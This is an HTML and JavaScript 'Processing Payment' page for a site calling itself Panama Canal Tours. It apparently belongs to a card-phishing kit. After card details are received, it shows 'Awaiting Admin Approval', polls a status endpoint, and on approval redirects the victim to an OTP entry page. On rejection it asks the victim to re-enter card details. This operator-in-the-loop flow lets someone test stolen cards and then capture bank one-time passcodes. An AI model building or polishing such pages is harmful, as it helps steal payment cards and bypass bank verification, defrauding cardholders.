<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Processing Payment | Panama Canal Tours</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 20px;
        }

        .container {
            text-align: center;
            background: white;
            padding: 60px 40px;
            border-radius: 10px;
            box-shadow: 0 4px 15px rgba(0, 0, 0, 0.2);
            max-width: 500px;
        }

        .spinner {
            border: 4px solid #f3f3f3;
            border-top: 4px solid #667eea;
            border-radius: 50%;
            width: 60px;
            height: 60px;
            animation: spin 1s linear infinite;
            margin: 0 auto 30px;
        }

        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }

        h1 {
            color: #333;
            font-size: 28px;
            margin-bottom: 10px;
        }

        p {
            color: #666;
            font-size: 16px;
            margin-bottom: 20px;
        }

        .status {
            background: #f0f0f0;
            padding: 20px;
            border-radius: 5px;
            margin: 20px 0;
        }

        .status-item {
            color: #666;
            font-size: 14px;
            margin: 8px 0;
        }

        .status-item.active {
            color: #667eea;
            font-weight: 600;
        }

        .countdown {
            color: #999;
            font-size: 12px;
            margin-top: 20px;
        }

        .error-container {
            display: none;
            background: #fee;
            padding: 20px;
            border-radius: 5px;
            margin-top: 20px;
        }

        .error-container h2 {
            color: #c33;
            font-size: 18px;
            margin-bottom: 10px;
        }

        .error-container p {
            color: #c33;
            font-size: 14px;
        }

        .btn-back {
            background: #667eea;
            color: white;
            padding: 12px 30px;
            border: none;
            border-radius: 5px;
            font-size: 14px;
            cursor: pointer;
            margin-top: 20px;
            display: none;
        }

        .btn-back:hover {
            background: #5568d3;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="spinner"></div>
        <h1>Processing Payment</h1>
        <p>Please wait while we verify your card details...</p>

        <div class="status">
            <div class="status-item active">✓ Card Details Received</div>
            <div class="status-item">⏳ Verifying with Bank...</div>
            <div class="status-item">⏳ Awaiting Admin Approval</div>
        </div>

        <div class="countdown">
            Auto-refresh in <span id="countdown">30</span> seconds...
        </div>

        <div class="error-container" id="errorContainer">
            <h2>❌ Payment Rejected</h2>
            <p id="errorMessage">Your card details could not be verified. Please check and try again.</p>
            <button class="btn-back" id="btnRetry" onclick="window.location.href='payment-card.html'">Back to Card Details</button>
        </div>
    </div>

    <script>
        const paymentId = sessionStorage.getItem('paymentId');
        const errorContainer = document.getElementById('errorContainer');
        const btnRetry = document.getElementById('btnRetry');
        let countdownValue = 30;

        // Countdown timer
        setInterval(() => {
            countdownValue--;
            document.getElementById('countdown').textContent = countdownValue;
            if (countdownValue <= 0) {
                checkPaymentStatus();
                countdownValue = 30;
            }
        }, 1000);

        // Check payment status
        async function checkPaymentStatus() {
            try {
                const response = await fetch(`/api/payment/status/${paymentId}`);
                const data = await response.json();

                if (data.status === 'approved') {
                    // Redirect to OTP page
                    sessionStorage.setItem('paymentId', paymentId);
                    window.location.href = 'payment-otp.html';
                } else if (data.status === 'rejected') {
                    // Show error message
                    document.querySelector('.spinner').style.display = 'none';
                    document.querySelector('h1').style.display = 'none';
                    document.querySelector('p').style.display = 'none';
                    document.querySelector('.status').style.display = 'none';
                    document.querySelector('.countdown').style.display = 'none';
                    
                    errorContainer.style.display = 'block';
                    document.getElementById('errorMessage').textContent = data.message || 'Please check your card details and try again.';
                    btnRetry.style.display = 'block';
                }
            } catch (error) {
                console.error('Error checking payment status:', error);
            }
        }

        // Initial check
        checkPaymentStatus();
    </script>
</body>
</html>
